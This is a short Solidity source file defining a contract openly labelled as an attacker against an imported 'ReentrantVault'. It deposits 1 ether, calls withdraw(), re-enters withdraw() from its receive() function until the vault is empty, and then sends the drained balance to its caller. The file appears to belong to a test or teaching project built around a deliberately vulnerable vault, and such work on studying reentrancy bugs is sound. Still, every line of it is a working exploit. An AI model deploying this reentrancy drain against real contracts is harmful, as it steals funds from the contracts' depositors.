// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ReentrantVault} from "../src/ReentrantVault.sol";

/// @notice Attacking contract: receives ETH from withdraw() and
///         re-enters until the vault is empty.
contract ReentrantAttacker {
    ReentrantVault public vault;

    constructor(address v) {
        vault = ReentrantVault(payable(v));
    }

    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }

    function drain() external {
        payable(msg.sender).call{value: address(this).balance}("");
    }
}
